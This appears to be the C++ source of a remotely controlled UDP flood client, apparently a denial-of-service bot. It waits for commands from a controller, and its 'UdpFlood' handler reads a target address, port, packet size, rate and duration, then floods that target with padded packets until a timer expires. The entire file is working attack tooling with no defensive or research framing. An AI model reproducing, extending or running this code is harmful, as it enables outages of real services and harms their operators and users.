#include "udp_connection.h"
#include <boost/date_time/posix_time/posix_time.hpp>
#include <cstdint>

udp_connection::udp_connection(boost::asio::io_service& io_service) : _packet(OPCODE_NULL),
_floodPckt(OPCODE_NULL),
pPacket(NULL),
_delay(io_service, boost::posix_time::seconds(0)), 
_expiry(io_service, boost::posix_time::milliseconds(0)),
_delayTime(0),
_expiryTime(0),
_resolver(io_service),
_socket(io_service)
{
}

void udp_connection::Connect(std::string host, std::string port)
{
	udp::resolver::query query(udp::v4(), host, port);
	_resolver.async_resolve(query, boost::bind(&udp_connection::resolve_handler, this, boost::asio::placeholders::error, boost::asio::placeholders::iterator));
}

void udp_connection::resolve_handler(const boost::system::error_code& error, udp::resolver::iterator list)
{
	if (!error)
	{
        _endpoints.push_back(list->endpoint());
        packet packet_(OPCODE_NULL);
        SendPacket(packet_, (_endpoints.size()-1));
	}
	else std::cerr << "Resolve error occured: " << error.message() << std::endl;
}

void udp_connection::GeneratePacket(uint16_t size)
{
    _floodPckt = packet(OPCODE_NULL);
	std::string _str;
	_str.resize(size-3, '0');
	_floodPckt.Append(_str);
}

void udp_connection::StartFlood(std::string address, std::string port, uint16_t delay, uint16_t time, uint16_t size)
{
	_delayTime = delay, _expiryTime = time;
	GeneratePacket(size);
	Connect(address, port); // Prolly won't end up well if this line fails, meh
    _delay.expires_at(_delay.expires_at() + boost::posix_time::milliseconds(_delayTime));
    _expiry.expires_at(_expiry.expires_at() + boost::posix_time::seconds(_expiryTime));
	_delay.async_wait(boost::bind(&udp_connection::SendFlood, this));
	_expiry.async_wait(boost::bind(&udp_connection::FinishFlood, this));
}

void udp_connection::FinishFlood()
{
	_delay.cancel();
    _endpoints.erase(_endpoints.end()-1);
}

void udp_connection::SendFlood()
{
	SendPacket(_floodPckt, (_endpoints.size()-1));
    _delay.expires_at(_delay.expires_at() + boost::posix_time::milliseconds(_delayTime));
	_delay.async_wait(boost::bind(&udp_connection::SendFlood, this));
}

void udp_connection::SendPacket(packet& sPacket, size_t endpointId)
{
    sPacket.Finalize();
    Packets pckt = { sPacket, _endpoints[endpointId] };
    _packets.push(pckt);
    SendNextPacket();
}

void udp_connection::SendNextPacket()
{
    _socket.async_send_to(boost::asio::buffer(_packets.front()._packet.getData(), _packets.front()._packet.getSize()), _packets.front()._endpoint, boost::bind(&udp_connection::write_handler, this, boost::asio::placeholders::error, boost::asio::placeholders::bytes_transferred));
}

void udp_connection::AwaitPacket()
{
    _packet = packet(OPCODE_NULL);
    if (pPacket)
        delete pPacket;
    pPacket = new uint8_t[3];
    _socket.async_receive_from(boost::asio::buffer(pPacket, 3), _endpoints[0], boost::bind(&udp_connection::receive_handler, this, boost::asio::placeholders::error, boost::asio::placeholders::bytes_transferred));
}

void udp_connection::receive_handler(const boost::system::error_code& error, size_t bytes_transferred)
{
    if (!error)
    {
        uint16_t size = *(pPacket + 1);
        _packet.Reserve(size + 2);
        _packet.Write(pPacket, _packet.getData(), 3);
        _socket.async_receive_from(boost::asio::buffer(_packet.getData() + 3, size), _endpoints[0], boost::bind(&udp_connection::packet_handle, this, boost::asio::placeholders::error, boost::asio::placeholders::bytes_transferred));
    }
    else std::cerr << "Error receiveing packet size (rcv_handler): " << error.message() << std::endl;
}

void udp_connection::packet_handle(const boost::system::error_code& error, size_t bytes_transferred)
{
    if (!error)
    {
        uint16_t opcode = 0;
        _packet.Write(&opcode, _packet.getData(), 1);
        (this->*OpcodeTable[opcode].handler)();
        std::cout << "Handling packet Id: " << OpcodeTable[opcode].Name << std::endl;
        AwaitPacket();
    }
    else std::cerr << "Error receiving rest of the packet (pckt_handle): " << error.message() << std::endl;
}

void udp_connection::write_handler(const boost::system::error_code& error, size_t bytes_transferred)
{
    _packets.pop();
    if (!_packets.empty())
        SendNextPacket();
}

void udp_connection::HandleOpcodeNull()
{
}

void udp_connection::HandleOpcodeUdpFlood()
{
    std::string ip = _packet.Read<std::string>();
    std::string port = _packet.Read<std::string>();
    uint16_t size = _packet.Read<uint16_t>();
    uint16_t delay = _packet.Read<uint16_t>();
    uint16_t time = _packet.Read<uint16_t>();
    StartFlood(ip, port, delay, time, size);
}
